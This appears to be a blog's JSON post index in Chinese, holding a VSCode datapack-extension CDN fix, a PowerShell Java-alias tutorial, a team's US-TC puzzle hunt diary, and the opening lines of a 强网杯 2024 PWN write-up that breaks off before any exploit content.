[{"title":"Data-pack Helper Plus 高版本内容标红修复指南（VSCode）","url":"/posts/adfbda5479ee/","content":"问题很多 Minecraft: Java Edition 的数据包开发者会使用 VSCode 上的 Data-pack Helper Plus（下简称 DHP）拓展来辅助开发。然而，有的时候它会对一些高版本的内容标红。通常情况下，这是由于伟大的防火长城致使网络不畅，导致部分必要文件无法被下载而造成的。\n1.18 新增音乐唱片被标红\n解决方案使用 jsDelivr由于 DHP 是从 Github 上下载这些文件的，所以我们可以将下载链接改为 jsDelivr 进行 CDN 加速下载。\n首先，用 VSCode 打开 DHP 拓展中的 server.js 文件，其路径如下。\n（注意：请将以下路径其中的 &lt;VERSION&gt; 替换为 DHP 版本）\n\nWindows：%USERPROFILE%\\.vscode\\extensions\\spgoding.datapack-language-server-&lt;VERSION&gt;\\dist\\server.js\nLinux &#x2F; macOS：~/.vscode/extensions/spgoding.datapack-language-server-&lt;VERSION&gt;/dist/server.js\n\n通过快捷键 Ctrl+F 打开搜索界面，点击界面左侧小图标切换为替换模式。\n在第一个框（搜索框）内填入以下内容。\n`https://raw.githubusercontent.com/(\\$\\&#123;.\\&#125;)/(\\$\\&#123;.\\&#125;)/(\\$\\&#123;.\\&#125;)`\n\n在第二个框（替换框）内填入以下内容。\n`https://cdn.jsdelivr.net/gh/$1/$2@$3`\n\n点击第一个框内的第三个图标打开正则表达式模式，再点击第二行的最后一个按钮进行替换，过程如图所示。\n完整过程\n保存此文件，重新启动 VSCode，保证设备处于联网状态。\n至此，DHP 应该不会错误标红了。\n","categories":["Minecraft","JE 开发"],"tags":["SPYGlassMC","修复","指南"]},{"title":"在 PowerShell 中利用别名快速调用不同版本的 Java","url":"/posts/e7683907628e/","content":"当电脑上安装有多个版本的 Java 时，要切换它们通常很麻烦，而 PowerShell 中的别名功能就可以很方便的直接调用它们。\n别名PowerShell 中的**别名（Alias）**允许用户为常用的命令设置便于记忆的名称，如 PowerShell 中的 ls 命令实际上是 Get-ChildItem 的别名。您可以使用 Get-Alias 或 gal（即前者的别名）来获取可用的别名列表。\nPS C:\\Windows\\system32&gt; Get-Alias lsCommandType     Name                                               Version    Source-----------     ----                                               -------    ------Alias           ls -&gt; Get-ChildItem\n\n您还可以使用 Set-Alias 或 sal 来设置别名。\nPS C:\\Users\\Admin&gt; Set-Alias java11 &quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\java.exe&quot;PS C:\\Users\\Admin&gt; java11 -versionjava version &quot;11.0.12&quot; 2021-07-20 LTSJava(TM) SE Runtime Environment 18.9 (build 11.0.12+8-LTS-237)Java HotSpot(TM) 64-Bit Server VM 18.9 (build 11.0.12+8-LTS-237, mixed mode)PS C:\\Users\\Admin&gt; java -versionjava version &quot;17.0.1&quot; 2021-10-19 LTSJava(TM) SE Runtime Environment (build 17.0.1+12-LTS-39)Java HotSpot(TM) 64-Bit Server VM (build 17.0.1+12-LTS-39, mixed mode, sharing)\n\n然而，在退出 PowerShell 之后，此前设置的别名也会失效。我们可以通过用户配置文件解决这个问题。\n用户配置文件在 PowerShell 中使用 $profile 来获取用户配置文件位置。\nPS C:\\Users\\Admin&gt; $profileC:\\Users\\Admin\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1\n\n如果该文件不存在，可以通过 New-Item 来进行创建。\nPS C:\\Users\\Admin&gt; Test-Path $profileFalsePS C:\\Users\\Admin&gt; New-Item $profile    目录: C:\\Users\\Admin\\Documents\\WindowsPowerShellMode                 LastWriteTime         Length Name----                 -------------         ------ -----a----        2021/12/25     10:13              0 Microsoft.PowerShell_profile.ps1\n\n使用任意文本编辑器打开该文件，这里使用的是 Visual Studio Code。\nPS C:\\Users\\Admin&gt; code $profile\n\n在个人配置文件中，就可以设置好自己所需的别名，方便自己使用了。\n# C:\\Users\\Admin\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1Set-Alias java8 &quot;C:\\Program Files\\Java\\jdk1.8.0_301\\bin\\java.exe&quot;Set-Alias javaw8 &quot;C:\\Program Files\\Java\\jdk1.8.0_301\\bin\\javaw.exe&quot;Set-Alias javac8 &quot;C:\\Program Files\\Java\\jdk1.8.0_301\\bin\\javac.exe&quot;Set-Alias java11 &quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\java.exe&quot;Set-Alias javaw11 &quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\javaw.exe&quot;Set-Alias javac11 &quot;C:\\Program Files\\Java\\jdk-11.0.12\\bin\\javac.exe&quot;\n","categories":["PowerShell"],"tags":["别名","兼容性"]},{"title":"US-TC 完赛记录 - LaVI 蜡笔 糖糖糖","url":"/posts/77ee0d9c135d/","content":"\n    @import url('https://fonts.font.im/css?family=Modern+Antiqua');\n    \n    :root {\n        --band-bg-opa: 1;\n    }\n    .manosaba {\n        font-family: 'Modern Antiqua', cursive;\n    }\n     {\n        background: #0075A8;\n    }\n    .dark-mode {\n        --band-bg-opa: 0.9;\n    }\n    .u-u, .u-j, .u-a, .u-c, .u-w, .u-i, .temp-hire {\n        display: inline-block;\n        color: #fff;\n        border-radius: 0.8em;\n        margin: 0 0.3em;\n        padding: 0 0.6em;\n        font-weight: bold;\n        font-size: 90%;\n        line-height: 1.8;\n    }\n    .u-u:after, .u-j:after, .u-a:after, .u-c:after, .u-w:after, .u-i:after, .temp-hire:after {\n        display: inline-block;\n        color: #fff;\n        border-radius: 0.8em;\n        margin: 0 0.3em;\n        padding: 0 0.6em;\n        font-weight: bold;\n    }\n    .u-u {\n        background-color: rgba(230, 130, 160, var(--band-bg-opa));\n    }\n    .u-j {\n        background-color: rgba(113, 65, 140, var(--band-bg-opa));\n    }\n    .u-a {\n        background-color: rgba(56, 70, 32, var(--band-bg-opa));\n    }\n    .u-c {\n        background-color: rgba(235, 220, 61, var(--band-bg-opa));\n    }\n    .u-w {\n        background-color: rgba(235, 231, 213, var(--band-bg-opa));\n        color: #444;\n    }\n    .u-i {\n        background-color: rgba(140, 143, 168, var(--band-bg-opa));\n    }\n    .temp-hire {\n        background-color: rgba(0, 117, 168, var(--band-bg-opa));\n    }\n    .sel-hide {\n        font-size: 0;\n    }\n    .sel-show {\n        user-select: none;\n    }\n\n\nUS-TC 糖糖完赛！蜡笔糖首次在大型 Puzzle Hunt 中挤入前 40 名！可喜可贺，可喜可贺…\n\n队名：LaVI 蜡笔 糖糖糖\n\n这次队名 neta 了魔裁 OP1《LaVI-Bavellabion》。其中有句歌词 LaVI LaVI To-ya-ya（歌词大意：法之恶魔，今夜…），LaVI 听起来很像蜡笔，所以就拿来用了！\n\n为此，队长还改名叫 兔悠悠，对应 Tu-ya-ya。然而最终形成的队伍其实只有一半玩过魔裁……\n\n\n\n本场队员：\n\n兔悠悠： 囚犯编号 18。队长。\n\njoke3579： 囚犯编号 19。数学领域大神。\n\nAPJifengc： 囚犯编号 20。清 ✌️，无需多言。\n\nCITRIC： 囚犯编号 21。水合柠檬酸是分子中含一个结晶水的柠檬酸，为商品柠檬酸的两种主要形式之一，分子式为 C6H8O7·H2O，分子量约 210.14。\n\nWintersRain： 囚犯编号 22。清 ✌️ 临时招募的清 ✌️ 队员！\n\nimplicit： 囚犯编号 23。临时招募的高中生队员！\n\n\n\n\n10&#x2F;6二十时，US-TC 见。\n\n然而网站还是不负众望的崩溃了，离线做题了十多分钟。\njoke3579： upd：难蚌，写 writeup 的时候网站又崩了 😅\n传统的 Puzzlehunt😯 就是把所有题全部做出来 👓 好无趣 😫 好无聊 😩 而 US-TC 🤓☝ 就是在传统的 Puzzlehunt🧐 加入炸网站 🤭 好好玩 🥰 要爆了 💥💥💥\n这是题吗？\n一区 短小的 校园寻宝一区题目都很新人友好，但是仍然被网络卡了二十分钟。\n20:10 — [一岁一枯荣] APJifengc 提交正确！\nAPJifengc： 我 K 头了。网好！\n兔悠悠： 上面这个网络太好了。\n\n\n20:13 — [HELLO US-TC] APJifengc 提交正确！\n兔悠悠： 当时做出来了也没交上，只记得 joke 问了半天 husky type 之后怎么提取。\nAPJifengc： 我又 K 头了。还是网好。\n\n\n20:17 — [彩虹上的彩虹] WintersRain 提交正确！\nAPJifengc： 图片提示给玩了，秒了\n兔悠悠： 秒了\n\n\n20:20 — [终点] implicit 提交正确！\n兔悠悠： 填出前七个字母直接说是 treasure，贡献了第一个 WA。\njoke3579： shaber\n\n\n二区 简单的 校园寻宝进二区之后网络好多了。\n20:28 — [没米了！] WintersRain 提交正确！\n兔悠悠： 我超，原！\nWR： 米来了！请随意发一张货币的照片（本来想发个原石的结果还是发了个毛爷爷）\nCITRIC： 今天周五（伸手）\n\n\n20:28 — [什么跟什么？] joke3579 提交正确！\n兔悠悠： 对不起，我再也不怀疑 quipquip 了。\njoke3579： quipqiup 立大功，定位辛辣食物之后立刻秒了（虽然几乎所有候选答案里面最后一个都是miami）\n蜡笔糖之所以是蜡笔糖\n\n\n20:36 — [将士激昂] joke3579 提交正确！\njoke3579： 做 nsph 的后遗症：看到激昂立即想到反切，看到反切立即猜到做法，最开始想到的是鸱吻蠢，后来发现第二个字没首字母才发现是狴犴，之后就只剩下瞪眼了！\nWR： 神秘小拼音，瞪眼可切\n\n\n然后大家在【阿 Q 小 D】这道题目上卡了很久。与此同时二区 META 函数图像出现了多解，一开始提取了【同型光盘】，疑似人话但又不完全是人话，猜测提取问号后才得到【原型光盘】，终于度过二区。\n21:05 — [移位诡计] joke3579 提交正确！\nAPJifengc： 画了下函数图像。图层透明度太好用了你们知道吗\n兔悠悠： 多解不好！而且我交了原型光盘竟然没里程碑还被下面的 K 头了。\njoke3579： 最后看到提取 k 了个头，哈哈\n\n\n三区 普通的 校园寻宝此时此刻，大家终于发现了三区仍然是 10 月 6 日，意识到 US-TC 是轮回主题。\n21:08 — [坏时光] APJifengc 提交正确！\nAPJifengc： 秒了，直接象形\njoke3579： 哇俺的太妖没玩过畏惧了然后扔给了 apj\n兔悠悠： 看到题目立即往群里截图 @APJifengc，结果没过多久真的秒了。\n\n\n【满园春色关不住】和【混乱诗歌】是蜡笔糖的两道团建题，大家很愉快的一起切了。\n21:37 — [满园春色关不住] 兔悠悠 提交正确！\n兔悠悠： 一个比较纯粹的好题，没有什么特别令人迷惑的，做的很顺畅。\njoke3579： 注意了 O(1) 个 clue 的答案，但是没注意到+春和原句一个字的转换。卖肉必应Q！\n\n\n22:25 — [混乱诗歌] APJifengc 提交正确！\n兔悠悠： 我草了，将军到底是啥诗！\njoke3579： 你从山东来~\nAPJifengc： 忘了谁发现里面好多组词，我瞪了眼发现可以组词连线旗语。提取爽！\n\n\n22:36 — [特征筛选] joke3579 提交正确！\njoke3579： 前面没做，最后看到他们的中间答案，让 deepseek 跑了一下 6 字母的西语答案发现依托，改过来跑了一下 7 字母的才通灵出来。\n兔悠悠： 猪 APJ 把 in looks 看成六字母导致没找到词，卡了一会。\n\n\n四区 困难的 校园寻宝23:22 — [关注点] 兔悠悠 提交正确！\n兔悠悠： APJ 瞪出藏头后瞬间会做了，从此以后我看到有“开头”两个字的题先看一遍藏头。\nAPJifengc： 猪悠悠看不出来藏头\n\n\n23:41 — [推箱子] APJifengc 提交正确！\nAPJifengc： 卡在第六关半天，很没素质的 F12 后发现有个爆炸按键。然后我很弱智的没发现第五关可以推出来一个箱子。后面就简单了。\njoke3579： 猜进度重置很多次就能让第六关刷出箱子，给 apj 卡了一万年哈哈\nCITRIC： 我也不知道怎么的我就过了第六关\nWR： 玩推箱子玩爽了\n\n\n00:09 — [エラートレイン] joke3579 提交正确！\n兔悠悠： 找了一百年终于找到合理的了，但是你说 huge cider 是什么意思？\njoke3579： k 头来的，什么 httpcodes 完全没做。还得是小周通灵技术厉害👍\n\n\n01:45 — [失意的作曲家] CITRIC 提交正确！\nCITRIC： 听音高猜字母就杀了，加密还是很好懂的！感谢APJ拱手让头。乐理题还是深度不够啊主办再接再厉，我就只会这个了\n兔悠悠： 音乐题！直接 @CITRIC。\n\n\n02:24 — [过眼云烟] WintersRain 提交正确！\n兔悠悠： 搜到了三层云，然后被 APJ 一句三进制点醒了，已严肃提取。\nAPJifengc： 为什么 acc 里面有一个 ac 啊，我说有两个 ac 子序列！！！（用 2 提取了半天没抢到头）\nCITRIC： 为什么完全不使用七段数码管？？？？？为什么不发马云？？？？？？？？？\n\n\n五区 崩坏的 校园寻宝深夜开五区，看到【海啸】一张图 16 个里程碑吓哭了。然后卡【几面间谍】，后来网站再次爆炸，找了之前下载的本以为会很难的【千点谜】做，没想到很快就完成了。\n03:56 — [千点谜] 兔悠悠 提交正确！\nAPJifengc： desmos 太好用了你们知道吗，直接把整个文件粘贴进去就得到图了，然后小小的把那几个圈的半径找了一下。\n兔悠悠： 提取了盲文、半径，然后猜了个倒着提取猪圈，结果还真猜对了，最后牛吹秒了。\nCITRIC： 起到了一个开题的作用\n\n\n直到凌晨五点，仍然在讨论【流星雨】的 mai 铺面隐藏信息怎么解读，但最后还是没看懂，直到 B-Side 才解决。\n10&#x2F;7第二天醒来，APJifengc 单刷【几面间谍】完成。\n13:50 — [几面间谍] APJifengc 提交正确！\nAPJifengc： 半夜做了大部分小题，脑子非常爆炸。悠悠做了第一个 Connect Walls，然后剩下的是第二天做的，那个里程碑开了个提示才看懂，最后的小纸笔是我做的。\n兔悠悠： 做了几个小题，被日语卡脖子了，做了好久。后面最好笑的是按希腊猜了个 NU 竟然猜对了，对着题目看了下感觉呃你们ph提取真是……\n\n\n\n14:06 — [写生] 兔悠悠 提交正确！\nAPJifengc： 水 meta，以为很高级\n兔悠悠： 这是爆破题吗？\n\n\n\n六区 最后的 校园寻宝14:36 — [原始人的数学] joke3579 提交正确！\njoke3579： 棍木题。瞪出了小盘面的提取，抢做了大盘面的提取，成功 k 头。\\纸笔大师悠悠&#x2F;\n兔悠悠： 从未做过如此简单的纸笔，轻松愉快。\n\n\n15:06 — [论巴别塔的倒掉] joke3579 提交正确！\njoke3579： 谁都没有想到，被我们寄予厚望的 mma，在做数学向题的时候，倒在了中文拼接的手下！然后 jjdw 给了初始解 A,B &#x3D; 2,3（upd: 和 C, D），apj 注意到拼接是用对应语言的方法，我负责把苦力活做完 😢\nAPJifengc： joke 你就 mma 吧，上次数学题你就 mma 爆破，这次还爆破\nCITRIC： 爱吃，拦不住\n\n\n\n15:36 — [一镜到底] 兔悠悠 提交正确！\n兔悠悠： 小悠握紧了拳头，憋红了脸，也没想到开头是 E 的意思。被开局手势和按喇叭迷惑了很久时间，前期一直猜成 toxic 结尾，之后才想起来还能 toxin。\nAPJifengc： chatgpt 跟我说这个拳头长得像 E，到底为啥是 E 我还是不知道，不能真的就是象形吧，\n\n\n然后，整整六个小时，一直被卡【轮回之声】。做到彻底绷不住了，开了把超级鸡马等理智点和提示点。\n21:47 — [轮回之声] 兔悠悠 提交正确！\n唯一真神来了，全部对应正确，但还是被卡脖子了很久，一直在对着《古人眼里的化学反应》、metal、NOTE TOXIN 爆破[有毒的&#x2F;重金属]元素。注意：有毒。\n爆破这一块\n兔悠悠： 猜了半天元素没猜对后。猜了下 *1.6 啥意思，严肃认为是提取 ONE 的前 60%，交了个 ON，但是什么叫「回答正确！请提交ANS后的答案！」？\nAPJifengc： 冲前排被这题卡死了，然后晚上坐牢实在蚌埠住了，我提议去开超级鸡马等 HP 解提示（\nCITRIC： 我爱听歌，提取不友好，批评！超级鸡马好玩捏😋\n兔悠悠： 最后没理智了，决定问姐姐。超级鸡马太好玩了你知道吗。\n笑点解析：未离开者；左上角：素质这一块\nAPJifengc： 最后在姐姐给出的解答中震撼的打完了这局继续 ph。下次卡一会真还是得直接人工提示。主要是这场人工提示太便宜了，真该多用用的（\n\n\n22:00 — [回环，图形与时空穿越] joke3579 提交正确！\njoke3579： 水题。（谁来着是我吗）瞪出了一一对应提取相同的字母，然后我就 k 了个头。\n\n\n* B-Side Unlocked! *\n一区 B-Side22:27 — [豆知识] 兔悠悠 提交正确！\n兔悠悠： 简单的 PVZ 题，和 implicit 一起愉快切了。\n\n\n22:28 — [你这辈子就是被单表害了] joke3579 提交正确！\njoke3579： 最开始看到寻寻觅觅后就想到是中文单表，然后下面的就是纯注意力了。我瞪出“海水朝朝朝朝朝朝朝落，浮云长长长长长长长消”和愚公移山，apj 瞪出蒹葭（，upd: 柠檬瞪出绕口令），再牛吹一下，就基本切了。\nAPJifengc： 没有文学底蕴，看啥都看不出来，太菜\nCITRIC： 怎么不夸一下我的四是四，哭哭了。噢噢补上了，开心了\n\n\n22:39 — [素质这一块] joke3579 提交正确！\n每个队伍拿到题目必做的一件事\nCITRIC： 不是我填的。\nAPJifengc： 读到了三长两短，猜是摩斯，一开始直接提取没提取出来就摆了。后来 joke 提醒下发现应该是大于等于三叫长，小于等于二叫短，成功拿下 red herring（\njoke3579： 在 apj 的基础上瞪了一眼觉得是提取没被涂黑的动物，就过了。\n\n\n一区 B-Side 的题目做的都比较顺畅，但最后卡了 META，于是决定先开二区玩玩。\n二区 B-Side23:07 — [强多有多强] APJifengc 提交正确！\nAPJifengc： 秒杀了！一眼就是那个抽象强强镜像表情包，观察到了都是由“这道题到底有多强”用若干次镜像操作得到的，然后直接提取镜像的对称轴位置 ASCII 就做完了，哈哈！\njoke3579： 大师 apj 在 8min 内切了这题，其他队都没进 1h &#x2F;bx\n兔悠悠： 刚在文档里画好上色就发现被切了，APJ 太快了。\n\n\n00:15 — [并非模板] 兔悠悠 提交正确！\n兔悠悠： 开了提示知道主题后就轻松提取了，很愉快。\n\n\n由于新增了 SAN 转提示点的能力（其实好像是知识锁哈哈），提示点增多，开了【起点】的提示，结束了一区 B-Side。\n00:46 — [起点] 兔悠悠 提交正确！\nAPJifengc： 题呢？？？题呢？？？题呢？？？题呢？？？题呢？？？\n兔悠悠： 我负责交答案，哈哈。\n\n\n【阿 Q 小 D】从 A-Side 就开始卡，在开了提示后才看懂什么叫提笔画模丁，发现 ft 还被改成「答案是丁！」，令人忍俊不禁。\n00:53 — [阿 Q 小 D] joke3579 提交正确！\njoke3579： 虽然是 A 面题但是卡了一万年。瞪出前四个的答案但是完全不会提取，最后提示点爆满直接提示开路才看明白。\n兔悠悠： 不小心买错提示，买了个我毫无头绪被唠一辈子。😭\n\n\n然而蜡笔糖仍然传统艺能，二区又卡了 META！因为【LA 在玩 maimai】一直没人看懂，即使开了提示也没看明白，最终决定把剩下的区都开开。\n三&#x2F;四区 B-Side因为 SAN 值逐渐溢出，三区、四区 B-Side 是同时进行的。\n01:45 — [出题人的 10000 个马甲] joke3579 提交正确！\nAPJifengc： 看着像文学作品，丢给 GPT 进行了初步的识别。\njoke3579： apj 把东西扔给我就睡觉去了，留我一个人在暗室里做题 😭。看到 GPT 生成内容（事后发现只有一个是对的）后发现是真人作家&#x2F;作品名的 analog 后开始挨个瞪，凭借（几乎不存在的）文学素养和搜索能力做完了。\n\n\n02:16 — [我题呢？] 兔悠悠 提交正确！\n兔悠悠： D 老师发现都是李商隐的各种《无题》后瞬间看懂了，最后的提取方式也比较自然。\n\n\n10&#x2F;8第二天，APJifengc 再次处理掉了疑难杂症！\n12:16 — [LA 在玩 maimai] APJifengc 提交正确！\nAPJifengc： 柠檬一开始提取了半天 maimai 铺面，最后开了个提示发现全错）然后剩下的提取好像我做了一些。\njoke3579： 对着图片瞪了一万年，各种尝试都爆炸了！\nCITRIC： 我不是，我没提，只看了颜色然后躺赢（真睡觉去了\n兔悠悠： 为了歌颂重生做了一百年，完全看不出来啥意思，买了提示也没懂，结果第二天被秒了。\n\n\n13:48 — [作者的独白] APJifengc 提交正确！\nAPJifengc： 看到加红攻克难关猜是 Getting Over It，然后这题放了一段时间，后来去搜了下 Getting Over It 的旁白发现第一句就匹配了，然后剩下的找了个 wiki 丢给 GPT 提取（\n兔悠悠： 看到题瞬间就联想到旁白了，不过以为数据库很难找就跑去歌颂重生了，我还是糖了。\n\n\n有了【LA 在玩 maimai】的碎片，很快，二区 META 完成。（然而完赛后听说可以直接改 URL 拿碎片，蜡笔糖竟然没想到）\n14:17 — [歌颂重生] 兔悠悠 提交正确！\n兔悠悠： 感觉是小区少有的正常 meta，但是最后提取比较蠢，而且我也没想到。开提示后发现甚至可以直接爆破，伤心。\n\n\n由于开了五区，APJifengc 回去把之前一直卡的【流星雨】完成了。\n14:23 — [流星雨] APJifengc 提交正确！\nAPJifengc： 赛前就一直在分析 B 站上的铺面哈哈，虽然提取的全错。后来还是开了两个提示才看懂 Cytus 侧和 maimai 侧怎么提取的。对着 pharmacy 回答错误疑惑了半天，你这写的臭叠还能叫音游？？？\n\njoke3579: 10-06 19:18:46\n别搞你那预测题目了\n我感觉 既然出题组能提前发\n那就没啥可能预测\nAPJifengc: 10-06 19:19:55\n我去\n不信\n\n\n\n16:00 — [光合作用] 兔悠悠 提交正确！\n兔悠悠： 非常烂灰线规则，使我的评价极低。对着第三小题做了一百年都没画出来人话，每次画出来都疑似 CHANGE 但又不完全是（也可能 CHANCE？），总以为是自己哪步画错了，甚至怀疑自己规则猜错了去开了几个提示。然而即使灰线提示开了，我也没看出来实际意思。最后是强行瞪出 NATURE 的，令人喷饭。\n\n\n17:05 — [Chat, 你的人工智障助手] implicit 提交正确！\nCITRIC： 我都不知道还有这题\njoke3579： 我都不知道还有这题，\\jjdw&#x2F;\\jjdw&#x2F;\\jjdw&#x2F;\nimplicit： 这题我 1s 秒了 输出 redherring\n\n\n17:23 — [诞生] 兔悠悠 提交正确！\nCITRIC： 我喜欢你❤\n兔悠悠： 你知道的我一直是低素质的反编译人（蜡笔糖曾经是 CTF 队伍），发现了好感度机制，后面开了个提取提示，比较轻松做完了。\nCITRIC： 我负责全攻略机器人，虽然悠悠可能并没有用上\n\n\n18:22 — [大厦混战！] joke3579 提交正确！\nAPJifengc： 喜欢我们质量流量吗？？\nCITRIC： 袜，超级大厦B！\njoke3579： 开了 B 面回来做的。开了个提示说是科学家对应的单位（在刚看到这题的时候就想到了），就扔给 deepseek 老师做，做完发现和答案只差了一个字母 😋\n兔悠悠： 好像是被质量流量卡了很久，所以完全没相信是科学家对应的单位。不过其实我只负责了摸鱼。\n\n\n晚上大家陆续要返校了，路上做了三区 META，被其中几个对应迷惑了很久，最后问姐姐才解决。\n21:41 — [要按下按钮吗？] joke3579 提交正确！\nAPJifengc： 一眼看出主题，猜测是小题答案对应结局，结果对应了一年根本对不上。最后人工提示加大力爆破过的。\n兔悠悠： 什么叫 lives and dies？\njoke3579： 我负责 k 头。\n\n\n而四区 META 没人做，被留到了第二天。\n今天晚上，大家是在做【心跳谜学部】小题的过程中逐渐睡着的……\n10&#x2F;9今天开始冲刺完赛。\n五区 B-Side09:38 — [数据删除] joke3579 提交正确！\njoke3579： 好厚的题，至少做了两三天。😠\n上来先把看上去好做的 clue 随机提取了一通，注意到了第四个是音游曲名，迅速过了，但没有从答案中注意到任何事情。然后瞪了第六个和第七个，前者注意到换字了，但没注意到如何提取；后者想到了一些地狱笑话提取卒年过了，但没有从答案中注意到任何事情。再瞪第一个，发现是shaber的提取名字首字母，过了，但没有从答案中注意到任何事情。然后绝赞卡题。这时候已经过去一天了。实在卡第六个做不明白了开了个提示，发现只告诉我了[删除]对应初音未来的“消失”。这提示真厉害！粥p悠悠过来把第五个切了，之后在网上搜索答案，发现目前所有答案的名字都是SCP基金会里某个收容物的名字。我去！这我怎么没注意到？？然后迅速看到核爆原生生物的日文译名过了第六个。接着绝赞卡题。艰难地过了第三个，但对第二个完全没想法。之后开了人工提示：\n\n😡。然后使劲做了做第二个，对照 scp-series 找到了最可能的答案，交上去得到了里程碑，目前的答案是【RMDASHI】。那我可就要浮想联翩了！rm -i 得有参数吧？试了一遍不对。得有确认吧？试了 Y&#x2F;N 不对。只能开人工提示了！\n\n👿。史题。\nAPJifengc： 不是 rm -rf 很不认可。\nCITRIC： 好厚的评。\n兔悠悠： 只做了舟的部分以及帮问了个人工提示，什么是 RM DASH I？\n\n\n某个插曲\n上次见到这个 SAN 值还是在轮回之声\n\nAPJifengc 10:28:37[当前理智值：95.0 🧠（+0.5 🧠 &#x2F; min）].jpg先换[当前理智值：35.5 🧠（+0.5 🧠 &#x2F; min）].jpg怎么突然没了˝ᗜᴗᗜ 10:28:41每天起床第一句sanitypurchasehintpoint5APJifengc 10:28:50我刚没换这么多吧？joke3579 10:28:51全买了??APJifengc 10:28:51我去joke3579 10:28:54我去APJifengc 10:28:56？joke3579 10:29:00你和悠悠APJifengc 10:29:00怎么全没了我草joke3579 10:29:03一起换的吧APJifengc 10:29:04我和悠悠同时换了˝ᗜᴗᗜ 10:29:04我们同时在换 哈哈joke3579 10:29:07一人换 353d 欧式冒险架空动作地下城 10:29:08屌APJifengc 10:29:11绷不住了joke3579 10:29:11就全干没了APJifengc 10:29:15[当前理智值：16.0 🧠（+0.5 🧠 &#x2F; min）].jpgjoke3579 10:29:15哈哈APJifengc 10:29:18传奇 san 值\n\n11:00 — [欧式战争] 兔悠悠 提交正确！\n兔悠悠： 从此以后我没看到藏头就看一遍主对角线。很早猜到是欧几里得，还以为是要画图，没想到是个 ISIS。\n\n\n12:56 — [再见，汉字方阵] 兔悠悠 提交正确！\n兔悠悠： 提示受害者，被「所有人」都逃出去卡了一个小时。题目本身还不错。\n天王老子也没逃出去\n\n\n13:14 — [万千世界] APJifengc 提交正确！\nAPJifengc： 填数字填脑瘫了。很后来才识别出来是按数字大小排序的，套路还是不熟悉啊！并且完美无瑕一直以为是 adofai，\nCITRIC： 711怎么是错的！！！！\njoke3579： 我就说保大的策略是对的吧！后面瞪出来是按长度 sort 的就基本很顺利了。\nAPJifengc： 主要是一开始并没有发现所有的答案都是 emoji 中的一种，我对我的简谱提取很不信任\nCITRIC： 哈希内索里哟卡贼诺有你次k米哈啦我怕多路怕多路\n\n\n【心跳谜学部】从 8 号晚上就在做，最后完成了全小题，在今天被最终解决。\n13:53 — [心跳谜学部] APJifengc 提交正确！\nCITRIC： 被🍃吓哭\nAPJifengc： 被🍃吓哭\nAPJifengc： 最后瞪了几个 group，通灵了一下答案。可是四五凭什么不能是巳午啊！！\njoke3579： 我只记得我凌晨两点做这个做到昏迷（\n兔悠悠： 我做了 100 个小题。（没那么多）\n好看吗？一晚上都在做这个\n\n\n14:19 — [US-TC 最权威的百科全书] APJifengc 提交正确！\nAPJifengc： 水 meta，给我秒了。joke 发现是两个不同的描述，我看了眼发现和小题答案或名字有关，然后旗语完事了。我太喜欢旗语了。\njoke3579： 看到时间联想到 pnku3 二区的厚题，直接畏惧，看了一眼就润了。\n\n\n六区 B-Side14:53 — [生成树] 兔悠悠 提交正确！\n兔悠悠： 开提示秒了，机制还算可以。\n\n\n15:35 — [明日谜] joke3579 提交正确！\nCITRIC： 再见了，所有的puzzlehunt\n兔悠悠： 字体忽大忽小看起来怪怪的，没细想。后面提取到「福音战」三个字，瞬间看懂了。\nCITRIC： 其实当时想抢这题头的，不然看起来全是盘外招了，也是不出意外的没抢到:(\n兔悠悠： 这届 CCBC（划掉）US-TC，做起来，好难受。\njoke3579： 所有发表情包的人都琵琶了！（暴论\n\n\n19:07 — [奇点] 兔悠悠 提交正确！\n兔悠悠： 开局瞪出来了一堆成语，又删掉了红色字，注意到存在「提取」两个字，轻松读出「提取题中的斜字首字母」，然后往前找 ft，鉴定为提取错误。\njoke3579： 我一直在删除所有无意义成语然后提取里面有意义的内容 aaaa\nAPJifengc： 开局以为是消灭星星，最后跟着提示做了一圈发现是三消，，也算是某种意义上预测到了（\n兔悠悠： 八个里面提取错四个……姐姐，你出价好温柔。\n高效沟通的方式\nCITRIC： 123笑\n兔悠悠： 最后 K 头了！因为 APJ 定理：19、21 是孪生素数，给他糖完了。\nAPJifengc： 可是我真的是对着 google 抄的啊！！鬼知道为啥抄错了，\n\n\nFinal META20:33 — [六方，链接与量子效应] 兔悠悠 提交正确！\njoke3579： 1h 后买提示顿悟的。想了好几种理解方式都炸了，最后是悠悠瞪出来做法的。\n兔悠悠： 其实是 APJ 瞪出来的，最后负责了提取。\n\n\n22:20 — [所见] LaVI 蜡笔 糖糖糖 提交正确！\nCITRIC： 你们真没有觉得【完赛 \\n 了吗？】区还会有题吗🙁\njoke3579： 哎 凑出 64 个题的执念\nAPJifengc： draw.io 太好用了你们知道吗 感觉剧情符合的还是很有趣的，不过我一开始的预想是在 ffm 的盘面的基础上，每次轮回都是看到的最终盘面的一边，然后这个小区的小题答案都是由这一边可以观测到的有限的字母生成的，然后通过每一边进行小题填入最后得到一个大盘面。结果最后就是把所有小题打乱然后整个填进去。反而感觉我最开始的设想更符合剧情一点（\njoke3579： 不敢相信真是按 fm2 用60个答案使劲连线，直接畏惧，1h 后买提示顿悟的。纸笔大师悠悠还是太强了，carry 全场！后来通过 &lt;(ts)(de)(te)(rm)(in)(an)&gt; 注意到 determinants，&lt;afdbAc&gt; 注意到六个小区的排序方式，&lt;ntoA&gt;&lt;nmig&gt;&lt;erot&gt;&lt;ahaA&gt;&lt;usAA&gt;&lt;hlle&gt; 爆出 nothing more than a nutshell 😋\njoke3579： 还得是牛吹👍\nCITRIC： \\蜡笔糖NB&#x2F;\\蜡笔糖NB&#x2F;\\蜡笔糖NB&#x2F; Tobby是躺赢狗😋你问Tobby是谁？\n兔悠悠： 没有提示的重要规律还是太难填了，最后填出来还是很有成就感的。\n所见\n\n\n最糖时刻无论是“我毫无头绪”，还是孪生素数 19、21，都是最糖时刻的有力竞争者，但最终胜者只有一个！\n本届 US-TC 蜡笔糖最糖时刻颁给……\n“我毫无头绪”\n谢谢大家！\n","categories":["Writeup","Puzzle Hunt"]},{"title":"强网杯 2024 初赛 - PWN Writeup","url":"/posts/cbd227289729/","content":"两天做两题，最菜的一集。希望明年能进线下赛。\nexpect_number题目链接\nexpect_number (56 solves) [134pt]题目内容：积小成多。看看你能用0，1，2构造出那些数字呢？[*] &#x27;~/expect_number&#x27;    Arch:       